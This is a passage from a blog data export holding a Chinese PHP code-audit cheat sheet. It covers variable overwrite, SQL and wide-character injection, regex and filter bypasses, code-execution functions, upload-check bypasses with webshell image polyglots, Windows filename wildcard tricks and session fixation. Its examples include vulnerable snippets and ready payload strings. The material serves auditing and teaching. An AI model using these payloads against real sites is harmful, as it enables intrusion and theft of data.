!ereg(&quot;^\\_[A-Z]+&quot;,$_key) &amp;&amp; $$_key=$_GET[$_key];\n}\n</code></pre>\n<p>通过表单来传值。</p>\n<pre><code class=\"html\">&lt;form method=&quot;post&quot; action=&quot;http://localhost/qibo/member/comment.php?job=ifcom&quot; enctype=&quot;multipart/form-data&quot;&gt;\n&lt;input type=&quot;file&quot; name=&quot;cidDB&quot;&gt;  \n&lt;input type=&quot;submit&quot;&gt;\n&lt;/form&gt;\n</code></pre>\n<p>这里的gid为查询参数</p>\n<pre><code class=\"php\">$_SERVER                 //中用户能够控制的变量，php5.0后不受GPC影响\nQUERY_STRING             //用户GET方法提交时的查询字符串\nHTTP_REFERER             //用户请求的来源变量，在一些程序取得用户访问记录时用得比较多\nHTTP_USER_AGENT          //用户的浏览器类型，也用于用户的访问记录的取得\nHTTP_HOST                //提交的主机头等内容\nHTTP_X_FORWARDED_FOR     //用户的代理主机的信息\n</code></pre>\n<h2 id=\"伪造IP\"><a href=\"#伪造IP\" class=\"headerlink\" title=\"伪造IP\"></a>伪造IP</h2><p>原理:<br>以 HTTP_ 开头的 header,  均属于客户端发送的内容。那么，如果客户端伪造user-agent/referer/client-ip/x-forward-for,就可以达到伪造IP的目的,php5之后不受GPC影响。</p>\n<pre><code class=\"php\">关键字：\nHTTP_\ngetenv\n$_SERVER\n服务端：\necho getenv(&#39;HTTP_CLIENT_IP&#39;);\necho $_SERVER[&#39;REMOTE_ADDR&#39;]; //访问端（有可能是用户，有可能是代理的）IP\necho $_SERVER[&#39;HTTP_CLIENT_IP&#39;]; //代理端的（有可能存在，可伪造）\necho $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; //用户是在哪个IP使用的代理（有可能存在，也可以伪造）\n客户端：\n注意发送的格式：\nCLIENT-IP:10.10.10.1\nX-FORWARDED-FOR:10.10.10.10\n</code></pre>\n<pre><code>这个玩意恒成立的。不管有没有clientip\n【strcasecmp(getenv(&#39;HTTP_CLIENT_IP&#39;), &#39;unknown&#39;)】\n</code></pre><h2 id=\"绕过正则匹配\"><a href=\"#绕过正则匹配\" class=\"headerlink\" title=\"绕过正则匹配\"></a>绕过正则匹配</h2><h3 id=\"缺少-和-限定\"><a href=\"#缺少-和-限定\" class=\"headerlink\" title=\"缺少^和$限定\"></a>缺少^和$限定</h3><h3 id=\"数组绕过正则\"><a href=\"#数组绕过正则\" class=\"headerlink\" title=\"数组绕过正则\"></a>数组绕过正则</h3><p>【\\A[ _a-zA-Z0-9]+\\z】</p>\n<h3 id=\"str-replace路径穿越\"><a href=\"#str-replace路径穿越\" class=\"headerlink\" title=\"str_replace路径穿越\"></a>str_replace路径穿越</h3><p>原理<br>str_replace的过滤方式为其search参数数组从左到右一个一个过滤。</p>\n<pre><code class=\"php\">## 这里可以被绕过，因为是对.和/或\\的组合的过滤，所以单独的..或\\/没有检测到。\n## 方法1\n## 五个点加///\n## 方法2\n## ...././/\n$dir = str_replace(array(&#39;..\\\\&#39;, &#39;../&#39;, &#39;./&#39;, &#39;.\\\\&#39;), &#39;&#39;, trim($dir),$countb);\necho $dir;\necho &#39;&lt;/br&gt;替换数量&#39;;\necho $countb;\n</code></pre>\n<pre><code class=\"php\">## 这里有对单独的.进行过滤，所以无法绕过。\n$file = str_replace(array(&#39;../&#39;, &#39;\\\\&#39;, &#39;..&#39;), array(&#39;&#39;, &#39;/&#39;, &#39;&#39;), $_GET[&#39;file&#39;],$counta);\necho $file;\necho &#39;&lt;/br&gt;替换数量&#39;;\necho $counta;\n</code></pre>\n<h2 id=\"short-open-tag-on-短标签\"><a href=\"#short-open-tag-on-短标签\" class=\"headerlink\" title=\"short_open_tag=on 短标签\"></a>short_open_tag=on 短标签</h2><p>原理：<br>当 php.ini 的short_open_tag=on时，PHP支持短标签，默认情况下为off；<br>格式为：&lt;?xxxx;?&gt; –&gt; &lt;?xxx;</p>\n<pre><code class=\"bash\">Go0s@ubuntu:~$ cat test.php\n&lt;?=&quot;helloworld&quot;;\nGo0s@ubuntu:~$ curl 127.0.0.1/test.php\nhelloworld\n</code></pre>\n<h2 id=\"file-put-contents第二个参数传入数组\"><a href=\"#file-put-contents第二个参数传入数组\" class=\"headerlink\" title=\"file_put_contents第二个参数传入数组\"></a>file_put_contents第二个参数传入数组</h2><p>原理：</p>\n<pre><code class=\"php\">file_put_contents(file,data,mode,context)\nfile    必需。规定要写入数据的文件。如果文件不存在，则创建一个新文件。\ndata    可选。规定要写入文件的数据。可以是字符串、数组或数据流。如果是数组的话，将被连接成字符串再进行写入。\n</code></pre>\n<pre><code class=\"php\">## ?filename=xiaowei.php&amp;data[]=&lt;?php&amp;data[]=%0aphpinfo();\n## 这个要从burp去传，因为后面的【?】会被理解为参数而截断\n&lt;?php\n$a = $_GET[&#39;data&#39;];\n$file = $_GET[&#39;filename&#39;];\n$current = file_get_contents($file);\nfile_put_contents($file, $a);\n</code></pre>\n<h2 id=\"单引号和双引号\"><a href=\"#单引号和双引号\" class=\"headerlink\" title=\"单引号和双引号\"></a>单引号和双引号</h2><p>原理：单引号或双引号都可以用来定义字符串。但只有双引号会调用解析器。</p>\n<pre><code class=\"php\"># 1\n$s = &quot;I am a &#39;single quote string&#39; inside a double quote string&quot;; \n$s = &#39;I am a &quot;double quote string&quot; inside a single quote string&#39;; \n$s = &quot;I am a &#39;single quote string&#39; inside a double quote string&quot;; \n$s = &#39;I am a &quot;double quote string&quot; inside a single quote string&#39;;\n# 2\n$abc=&#39;I love u&#39;; \necho $abc //结果是:I love u \necho &#39;$abc&#39; //结果是:$abc \necho &quot;$abc&quot; //结果是:I love u \n# 3\n$a=&quot;${@phpinfo()}&quot;; //可以解析出来\n&lt;?php $a=&quot;${@phpinfo()}&quot;;?&gt; //@可以为空格，tab，/**/ ，回车，+，-，!，~,\\等\n</code></pre>\n<h3 id=\"查询语句缺少单引号\"><a href=\"#查询语句缺少单引号\" class=\"headerlink\" title=\"查询语句缺少单引号\"></a>查询语句缺少单引号</h3><pre><code class=\"php\">&quot;Select * from table where id=$id&quot; # 有注入\n&quot;Select * from table where id=&quot;.$id.&quot; limit 1&quot; # 有注入\n&quot;Select * from table where id=&#39;$id&#39;&quot; # 无注入\n&quot;Select * from table where id=&#39;&quot;.$id.&quot;&#39; limit 1&quot; # 无注入\n</code></pre>\n<h2 id=\"宽字符注入\"><a href=\"#宽字符注入\" class=\"headerlink\" title=\"宽字符注入\"></a>宽字符注入</h2><p>原理<br>常见转码函数：<br>iconv()<br>mb_convert_encoding()<br>addslashes<br>防御：<br>用mysql_real_escape_string</p>\n<pre><code class=\"php\">## ?username=tom&amp;password=1%df&#39; or 1=1 union select 1,2,group_concat(0x0a,mname,0x0a,pwd) from manager--+\n## %df把\\给吃掉\n$pwd = addslashes($pwd);\nmysql_query(&quot;SET NAMES gbk&quot;);\n$query = &quot;select * from user where uname=&#39;&quot;.$uname.&quot;&#39; and pwd=&#39;&quot;.$pwd.&quot;&#39;&quot;;\n</code></pre>\n<h2 id=\"跳转无退出\"><a href=\"#跳转无退出\" class=\"headerlink\" title=\"跳转无退出\"></a>跳转无退出</h2><p>原理:<br>没有使用return()或die()或exit()退出流程的话，下面的代码还是会继续执行。可以使用burp测试，不会跳转过去。</p>\n<pre><code class=\"php\">## 1\n$this-&gt;myclass-&gt;notice(&#39;alert(&quot;系统已安装过&quot;);window.location.href=&quot;&#39;.site_url().&#39;&quot;;&#39;);\n## 2\nheader(&quot;location: ../index.php&quot;);\n</code></pre>\n<h2 id=\"二次编码注入\"><a href=\"#二次编码注入\" class=\"headerlink\" title=\"二次编码注入\"></a>二次编码注入</h2><p>由于浏览器的一次urldecode，再由服务器端函数的一次decode，造成二次编码，而绕过过滤。<br>如%2527，两次urldecode会最后变成’</p>\n<pre><code>base64_decode -- 对使用 MIME base64 编码的数据进行解码\nbase64_encode -- 使用 MIME base64 对数据进行编码\nrawurldecode -- 对已编码的 URL 字符串进行解码\nrawurlencode -- 按照 RFC 1738 对 URL 进行编码\nurldecode -- 解码已编码的 URL 字符串\nurlencode -- 编码 URL 字符串\nunserialize/serialize\n字符集函数（GKB,UTF7/8...）如iconv()/mb_convert_encoding()等\n</code></pre><h2 id=\"前端可控变量填充导致XSS\"><a href=\"#前端可控变量填充导致XSS\" class=\"headerlink\" title=\"前端可控变量填充导致XSS\"></a>前端可控变量填充导致XSS</h2><p>当html里的链接是变量时，易出现XSS。</p>\n<pre><code class=\"html\">=\n</code></pre>\n<h2 id=\"命令执行函数\"><a href=\"#命令执行函数\" class=\"headerlink\" title=\"命令执行函数\"></a>命令执行函数</h2><pre><code class=\"php\">system()\nexec()\npassthru()\npcntl_exec()\nshell_exec()\necho `whoami`; //反引号调用shell_exec()函数\npopen()和proc_open() //不会返回结果\narray_map($arr,$array); //为数组的每个元素应用回调函数arr,如$arr = &quot;phpinfo&quot;\npopen(&#39;whoami &gt;&gt;D: /2.txt&#39;, &#39;r&#39;); //这样就会在D下生成一个2.txt。\npreg_replace()\nob_start()\narray_map()\n</code></pre>\n<p>防范方法：<br>使用自定义函数或函数库来替代外部命令的功能<br>使用escapeshellarg 函数来处理命令参数<br>使用safe_mode_exec_dir 指定可执行文件的路径</p>\n<h3 id=\"create-function\"><a href=\"#create-function\" class=\"headerlink\" title=\"create_function\"></a>create_function</h3><p>create_function构造了一个return后面的语句为一个函数。</p>\n<pre><code class=\"php\">#?sort_by=&quot;]);}phpinfo();/*\n#sort_function就变成了 return 1 * strnatcasecmp($a[&quot;&quot;]);}phpinfo();/*&quot;], $b[&quot;&quot;]);}phpinfo();/*&quot;]);\n#前面闭合，然后把后面的全部注释掉了。\n&lt;?php\n$sort_by=$_GET[&#39;sort_by&#39;];\n$sorter=&#39;strnatcasecmp&#39;;\n$databases=array(&#39;test&#39;,&#39;test&#39;);\n$sort_function = &#39; return 1 * &#39; . $sorter . &#39;($a[&quot;&#39; . $sort_by . &#39;&quot;], $b[&quot;&#39; . $sort_by . &#39;&quot;]);&#39;;\nusort($databases, create_function(&#39;$a, $b&#39;, $sort_function));\n</code></pre>\n<h3 id=\"mb-ereg-replace-的-e模式\"><a href=\"#mb-ereg-replace-的-e模式\" class=\"headerlink\" title=\"mb_ereg_replace()的/e模式\"></a>mb_ereg_replace()的/e模式</h3><p>原理</p>\n<pre><code>mb_ereg_replace()是支持多字节的正则表达式替换函数,函数原型如下:\nstring mb_ereg_replace  ( string $pattern , string $replacement  , string $string  [, string $option= &quot;msr&quot;  ] )\n当指定mb_ereg(i)_replace()的option参数为e时,replacement参数[在适当的逆向引用替换完后]将作为php代码被执行.\n</code></pre><h3 id=\"preg-replace-e模式执行命令\"><a href=\"#preg-replace-e模式执行命令\" class=\"headerlink\" title=\"preg_replace /e模式执行命令\"></a>preg_replace /e模式执行命令</h3><pre><code class=\"php\"># ?str=[phpinfo()]\n# 这里使用/e模式，所以第二个参数\\\\1这里可以执行。\n# 通过$_GET传入值，第一个参数正则,把[]去掉，放到了第二个参数里\\\\1，执行。\npreg_replace(&quot;/\\[(.*)]/e&quot;,&#39;\\\\1&#39;,$_GET[&#39;str&#39;]);\n</code></pre>\n<h2 id=\"动态函数执行\"><a href=\"#动态函数执行\" class=\"headerlink\" title=\"动态函数执行\"></a>动态函数执行</h2><pre><code class=\"php\">call_user_func\ncall_user_func_array\n</code></pre>\n<pre><code class=\"php\"># ?a=assert\ncall_user_func($_GET[&#39;a&#39;],$b);\n</code></pre>\n<h2 id=\"代码执行\"><a href=\"#代码执行\" class=\"headerlink\" title=\"代码执行\"></a>代码执行</h2><pre><code class=\"php\">assert()\ncall_user_func()\ncall_user_func_array()\ncreate_function()\n</code></pre>\n<h3 id=\"eval-和assert-代码执行\"><a href=\"#eval-和assert-代码执行\" class=\"headerlink\" title=\"eval()和assert()代码执行\"></a>eval()和assert()代码执行</h3><p>当assert()的参数为字符串时 可执行PHP代码。<br>区别：assert可以不加;，eval不可以不加;。</p>\n<pre><code class=\"php\">eval(&quot; phpinfo(); &quot;);【√】 eval(&quot; phpinfo() &quot;);【X】\nassert(&quot; phpinfo(); &quot;);【√】 assert(&quot; phpinfo() &quot;);【√】\n</code></pre>\n<h2 id=\"优先级绕过\"><a href=\"#优先级绕过\" class=\"headerlink\" title=\"优先级绕过\"></a>优先级绕过</h2><p>原理：<br>如果运算符优先级相同，那运算符的结合方向决定了该如何运算<br><a href=\"http://php.net/manual/zh/language.operators.precedence.php\" target=\"_blank\" rel=\"noopener\">http://php.net/manual/zh/language.operators.precedence.php</a></p>\n<p>优先级：&amp;&amp;/|| 大于 = 大于 AND/OR</p>\n<pre><code class=\"php\"># ($test = true) and false; $test2 = (true &amp;&amp; false);\n$test = true and false; var_dump($test);//bool(true) \n$test2 = true &amp;&amp; false; var_dump($test2); //bool(false)\n\n# 当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过\n$test3 = is_numeric(&quot;123&quot;) and is_numeric(&quot;anything false&quot;); var_dump($test3); //bool(true)\n</code></pre>\n<h2 id=\"getimagesize图片判断绕过\"><a href=\"#getimagesize图片判断绕过\" class=\"headerlink\" title=\"getimagesize图片判断绕过\"></a>getimagesize图片判断绕过</h2><p>原理：<br>当用getimagesize判断文件是否为图片,可以判断的文件为gif/png/jpg，如果指定的文件如果不是有效的图像，会返回 false。<br>只要我们在文件头部加入GIF89a后可以上传任意后缀文件。</p>\n<p>生成小马图的方法：</p>\n<pre><code class=\"bash\">cat image.png webshell.php &gt; image.php\n</code></pre>\n<pre><code class=\"php\">## 找上传点\n## 文件头部加入GIF89a\n# 1\n$file = $request-&gt;getFiles();\n# 2\nif(getimagesize($files[&#39;users&#39;][&#39;photo&#39;][&#39;tmp_name&#39;]))\n        {\n          move_uploaded_file($files[&#39;users&#39;][&#39;photo&#39;][&#39;tmp_name&#39;], $filename);\n# 3\n$filesize = @getimagesize(&#39;/path/to/image.png&#39;);\nif ($filesize) {\n    do_upload();\n}\n</code></pre>\n<h2 id=\"lt-变-，windows-findfirstfile利用\"><a href=\"#lt-变-，windows-findfirstfile利用\" class=\"headerlink\" title=\"&lt;变*，windows findfirstfile利用\"></a>&lt;变*，windows findfirstfile利用</h2><p>原理：<br>Windows下，在搜索文件的时候使用了FindFirstFile这一个winapi函数，该函数到一个文件夹(包含子文件夹)去搜索指定文件。<br>执行过程中，字符”&gt;”被替换成”?”，字符”&lt;”被替换成”*”，而符号”（双引号）被替换成一个”.”字符。<br>所以：</p>\n<ol>\n<li>“&gt;””&gt;&gt;”可代替一个字符,”&lt;”可以代替后缀多个字符，”&lt;&lt;”可以代替包括文件名和后缀多个字符。所以一般使用&lt;&lt;</li>\n<li>“ 可以代替.</li>\n<li>文件名第一个字符是”.”的话，读取时可以忽略之</li>\n</ol>\n<table>\n<thead>\n<tr>\n<th>NO</th>\n<th>Status</th>\n<th>Function</th>\n<th>Type of operation</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>1.</td>\n<td>OK</td>\n<td>include()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>2.</td>\n<td>OK</td>\n<td>include_once()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>3.</td>\n<td>OK</td>\n<td>require()</td>\n<td>Includefile</td>\n</tr>\n<tr>\n<td>4.</td>\n<td>OK</td>\n<td>require_once()</td>\n<td>Include file</td>\n</tr>\n<tr>\n<td>5.</td>\n<td>OK</td>\n<td>fopen()</td>\n<td>Openfile</td>\n</tr>\n<tr>\n<td>6.</td>\n<td>OK</td>\n<td>ZipArchive::open()</td>\n<td>Archive file</td>\n</tr>\n<tr>\n<td>7.</td>\n<td>OK</td>\n<td>copy()</td>\n<td>Copyfile</td>\n</tr>\n<tr>\n<td>8.</td>\n<td>OK</td>\n<td>file_get_contents()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>9.</td>\n<td>OK</td>\n<td>parse_ini_file()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>10.</td>\n<td>OK</td>\n<td>readfile()</td>\n<td>Readfile</td>\n</tr>\n<tr>\n<td>11.</td>\n<td>OK</td>\n<td>file_put_contents()</td>\n<td>Write file</td>\n</tr>\n<tr>\n<td>12.</td>\n<td>OK</td>\n<td>mkdir()</td>\n<td>New directory creation</td>\n</tr>\n<tr>\n<td>13.</td>\n<td>OK</td>\n<td>tempnam()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>14.</td>\n<td>OK</td>\n<td>touch()</td>\n<td>New file creation</td>\n</tr>\n<tr>\n<td>15.</td>\n<td>OK</td>\n<td>move_uploaded_file()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>16.</td>\n<td>OK</td>\n<td>opendiit)</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>17.</td>\n<td>OK</td>\n<td>readdir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>18.</td>\n<td>OK</td>\n<td>rewinddir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>19.</td>\n<td>OK</td>\n<td>closedir()</td>\n<td>Directory operation</td>\n</tr>\n<tr>\n<td>20.</td>\n<td>FAIL</td>\n<td>rename()</td>\n<td>Move operation</td>\n</tr>\n<tr>\n<td>21.</td>\n<td>FAIL</td>\n<td>unlink()</td>\n<td>Delete file</td>\n</tr>\n<tr>\n<td>22.</td>\n<td>FAIL</td>\n<td>rmdir())</td>\n<td>Directory operation</td>\n</tr>\n</tbody>\n</table>\n<pre><code class=\"php\">## ?file=1&lt;\n## ?file=1&gt;\n## ?file=1&quot;txt\n文件名为1.txt\n\n## ?file=1234.tx&gt;\n## ?file=1234.&lt;\n## ?file=1&lt;&lt;\n## ?file=1&lt;&lt;&quot;&gt;\n## ?file=123&gt;&quot;&gt;\n## ?file=&gt;&gt;&gt;4&quot;&gt;\n## ?file=&lt;&lt;4&quot;&gt;\n文件名为1234.txt\n\ninclude(&#39;shell&lt;&#39;);  \ninclude(&#39;shell&lt;&lt;&#39;);\ninclude(&#39;shell.p&gt;p&#39;); \ninclude(&#39;shell&quot;php&#39;);\nfopen(&#39;.htacess&#39;);  //==&gt;fopen(&quot;htacess&#39;);\nfile_get_contents(&#39;C:boot.ini&#39;); //==&gt;  file_get_contents (&#39;C:/boot.ini&#39;);\nfile_get_contents(&#39;C:/tmp/con.jpg&#39;); //此举将会无休无止地从CON设备读取0字节，直到遇到eof\nfile_put_contents(&#39;C:/tmp/con.jpg&#39;,chr(0×07));  //此举将会不断地使服务器发出类似哔哔的声音\n</code></pre>\n<h2 id=\"处理value没有处理key\"><a href=\"#处理value没有处理key\" class=\"headerlink\" title=\"处理value没有处理key\"></a>处理value没有处理key</h2><p>foreach时,addslashes对获得的value值进行处理，但没有处理key。</p>\n<h2 id=\"用来目录遍历的特别函数\"><a href=\"#用来目录遍历的特别函数\" class=\"headerlink\" title=\"用来目录遍历的特别函数\"></a>用来目录遍历的特别函数</h2><p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088094</a><br>lstat 函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-088071</a><br>stream_resolve_include_path函数</p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083688</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083457</a></p>\n<p><a href=\"http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453\" target=\"_blank\" rel=\"noopener\">http://wooyun.webbaozi.com/bug_detail.php?wybug_id=wooyun-2014-083453</a></p>\n<h2 id=\"绕过GD库图片渲染\"><a href=\"#绕过GD库图片渲染\" class=\"headerlink\" title=\"绕过GD库图片渲染\"></a>绕过GD库图片渲染</h2><p><a href=\"file/PHP代码审计_jpg_payload.zip\">jpg_payload.zip</a></p>\n<p>jpg_name.jpg是待GD处理的图片</p>\n<pre><code>php jpg_payload.php &lt;jpg_name.jpg&gt;\n</code></pre><p>生成好的图片，在经过如下代码处理后，依然能保留其中的shell：</p>\n<pre><code class=\"php\">&lt;?php\n    imagecreatefromjpeg(&#39;xxxx.jpg&#39;);\n?&gt;\n</code></pre>\n<h2 id=\"会话固定\"><a href=\"#会话固定\" class=\"headerlink\" title=\"会话固定\"></a>会话固定</h2><pre><code class=\"php\">if(!empty($_GET[&#39;phpsessid&#39;])) session_id($_GET[&#39;phpsessid&#39;]);//通过GET方法传递sessionid\n</code></pre>\n<p>通过get方法来设置session。所以可以通过CSRF：</p>\n<p><a href=\"http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123\" target=\"_blank\" rel=\"noopener\">http://xxxx/index.php?r=admin/index/index&amp;phpsessid=f4cking123</a></p>\n<p>管理员点了我们就能使用此session进后台了。</p>\n<h2 id=\"end方法获取元素的问题\"><a href=\"#end方法获取元素的问题\" class=\"headerlink\" title=\"end方法获取元素的问题\"></a>end方法获取元素的问题</h2><pre><code class=\"php\">$file = array(1 =&gt; &#39;png&#39;, 0 =&gt; &#39;php&#39;);\n\n$ext = $file[count($file) - 1];\n\n$ext = end($file);\n</code></pre>\n<p>两者的区别是，前者是通过下标来确定，后者则是返回数组的最后一个元素。前者返回的是$filename[1]也就是png,后者直接返回数组排在最后面的元素php。</p>\n<h2 id=\"资料\"><a href=\"#资料\" class=\"headerlink\" title=\"资料\"></a>资料</h2><p>PHP代码审计分段讲解</p>\n<p><a href=\"https://github.com/bowu678/php_bugs\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs</a></p>\n<p><a href=\"https://github.com/jiangsir404/Audit-Learning\" target=\"_blank\" rel=\"noopener\">https://github.com/jiangsir404/Audit-Learning</a></p>\n<p><a href=\"https://read.douban.com/reader/ebook/16642056/\" target=\"_blank\" rel=\"noopener\">https://read.douban.com/reader/ebook/16642056/</a></p>\n","site":{"data":{}},"excerpt":"<h1 id=\"PHP代码审计归纳\"><a href=\"#PHP代码审计归纳\" class=\"headerlink\" title=\"PHP代码审计归纳\"></a>PHP代码审计归纳</h1><p>Author: 木禾 ali0th</p>\n<p><a href=\"https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md\" target=\"_blank\" rel=\"noopener\">https://github.com/Martin2877/Ali0thNotes/blob/master/Code%20Audit/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%BD%92%E7%BA%B3.md</a></p>\n<h2 id=\"变量覆盖\"><a href=\"#变量覆盖\" class=\"headerlink\" title=\"变量覆盖\"></a>变量覆盖</h2><h3 id=\"extract\"><a href=\"#extract\" class=\"headerlink\" title=\"extract()\"></a>extract()</h3><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。</p>\n<pre><code class=\"php\">&lt;?php\n$a = &quot;Original&quot;;\n$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);\nextract($my_array); \necho &quot;\\$a = $a; \\$b = $b; \\$c = $c&quot;;\n?&gt;\n# 结果：$a = Cat; $b = Dog; $c = Horse\n</code></pre>\n<p>这里原来是\\$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>\n<pre><code class=\"php\">#?shiyan=&amp;flag=1\n&lt;?php\n$flag=&#39;xxx&#39;; \nextract($_GET);\n if(isset($shiyan))\n { \n    $content=trim(file_get_contents($flag)); # content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0\n    if($shiyan==$content)\n    { \n        echo &#39;ctf{xxx}&#39;; \n    }\n   else\n   { \n    echo&#39;Oh.no&#39;;\n   } \n   }\n</code></pre>","more":"<h3 id=\"parse-str\"><a href=\"#parse-str\" class=\"headerlink\" title=\"parse_str()\"></a>parse_str()</h3><p>解析字符串并注册成变量</p>\n<pre><code class=\"php\">$b=1;\nParse_str(&#39;b=2&#39;);\nPrint_r($b);\n# 结果: $b=2\n</code></pre>\n<h3 id=\"import-request-variables\"><a href=\"#import-request-variables\" class=\"headerlink\" title=\"import_request_variables()\"></a>import_request_variables()</h3><pre><code class=\"php\">将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。\n在5.4之后被取消，只可在4-4.1.0和5-5.4.0可用。\n//导入POST提交的变量值，前缀为post_\nimport_request_variable(&quot;p&quot;， &quot;post_&quot;);\n//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST\nimport_request_variable(&quot;gp&quot;， &quot;gp_&quot;);\n//导入Cookie和GET的变量值，Cookie变量值优先于GET\nimport_request_variable(&quot;cg&quot;， &quot;cg_&quot;);\n</code></pre>\n<h3 id=\"变量覆盖-1\"><a href=\"#变量覆盖-1\" class=\"headerlink\" title=\"$变量覆盖\"></a>$变量覆盖</h3><pre><code class=\"php\">## 提交参数chs，则可覆盖变量&quot;$chs&quot;的值。$key为chs时，$$key就变成$chs\n&lt;?  \n$chs = &#39;&#39;;  \nif($_POST &amp;&amp; $charset != &#39;utf-8&#39;){  \n    $chs = new Chinese(&#39;UTF-8&#39;, $charset);  \n    foreach($_POST as $key =&gt; $value){  \n        $$key = $chs-&gt;Convert($value);  \n    }  \n    unset($chs);  \n}\n</code></pre>\n<h3 id=\"全局变量覆盖漏洞\"><a href=\"#全局变量覆盖漏洞\" class=\"headerlink\" title=\"全局变量覆盖漏洞\"></a>全局变量覆盖漏洞</h3><p>原理：<br>register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。<br>如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.</p>\n<p>\\$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。</p>\n<pre><code class=\"php\">&lt;?php\n// register_globals =ON\n//foo.php?GLOBALS[foobar]=HELLO\necho $foobar;\n\n//为了安全取消全局变量\n//var.php?GLOBALS[a]=aaaa&amp;b=111\nif (ini_get(&quot;register_globals&quot;)) foreach($_REQUEST as $k=&gt;$v) unset(${$k});\nprint $a;\nprint $_GET[b];\n</code></pre>\n<p>经过测试，开了register_globals会卡死</p>\n<h2 id=\"绕过过滤的空白字符\"><a href=\"#绕过过滤的空白字符\" class=\"headerlink\" title=\"绕过过滤的空白字符\"></a>绕过过滤的空白字符</h2><p>原理：<a href=\"https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6\" target=\"_blank\" rel=\"noopener\">https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a></p>\n<pre><code>控制码\n&quot;\\0&quot; &quot;%00&quot; (ASCII  0 (0x00))，空字节符。\n\n制表符\n&quot;\\t&quot; (ASCII  9 (0x09))，水平制表符。\n\n空白字符：\n&quot;\\n&quot; (ASCII 10 (0x0A))，换行符。\n&quot;\\v&quot; &quot;\\x0b&quot; (ASCII  11 (0x0B))，垂直制表符。\n&quot;\\f&quot; &quot;%0c&quot; 换页符\n&quot;\\r&quot; &quot;%0d&quot;(ASCII  13 (0x0D))，回车符。\n\n空格:\n&quot; &quot; &quot;%20&quot; (ASCII  32 (0x20))，普通空格符。\n</code></pre><p>而trim过滤的空白字符有</p>\n<pre><code class=\"php\">string trim ( string $str [, string $character_mask = &quot; \\t\\n\\r\\0\\x0B&quot; ] )\n</code></pre>\n<p>其中缺少了\\f</p>\n<p>2 函数对空白字符的特性<br>is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。<br>也就是说，is_numeirc(“ \\r\\n \\t 1.2”)是会返回true的。同理，intval(“ \\r\\n \\t 12”)，也会正常返回12。</p>\n<p>案例</p>\n<p><a href=\"https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php\" target=\"_blank\" rel=\"noopener\">https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php</a></p>\n<pre><code class=\"php\">#?number=%00%0c191\n# 1 %00绕过is_numeric\n# 2 \\f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符\n</code></pre>\n<h2 id=\"intval整数溢出\"><a href=\"#intval整数溢出\" class=\"headerlink\" title=\"intval整数溢出\"></a>intval整数溢出</h2><p>php整数上限溢出绕过intval</p>\n<p>intval 函数最大的值取决于操作系统。<br>32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。<br>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>\n<h2 id=\"intval-四舍五入\"><a href=\"#intval-四舍五入\" class=\"headerlink\" title=\"intval 四舍五入\"></a>intval 四舍五入</h2><pre><code class=\"php\"># 